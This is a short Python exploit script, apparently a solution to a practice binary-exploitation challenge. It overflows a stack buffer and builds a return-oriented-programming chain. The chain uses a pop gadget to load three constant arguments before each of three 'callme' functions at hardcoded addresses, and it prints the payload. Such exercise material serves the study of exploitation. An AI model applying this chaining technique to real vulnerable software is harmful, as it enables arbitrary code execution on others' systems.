#!/usr/bin/env python

import struct
import sys

padding_len = 32 #until just before rbp is overwritten

rbp = struct.pack("L", 0xdeadbeef)

deadbeef = struct.pack("L", 0xdeadbeefdeadbeef)
cafebabe = struct.pack("L", 0xcafebabecafebabe)
doodfood = struct.pack("L", 0xd00df00dd00df00d)

callme_one = struct.pack("L", 0x00400720)
callme_two = struct.pack("L", 0x00400740)
callme_three = struct.pack("L", 0x004006f0)

gad_pop3_ret = struct.pack("L", 0x0040093c)

pop_args = gad_pop3_ret + deadbeef + cafebabe + doodfood

payload = b'A'*padding_len
payload += rbp
payload += pop_args
payload += callme_one
payload += pop_args
payload += callme_two
payload += pop_args
payload += callme_three

sys.stdout.buffer.write(payload)
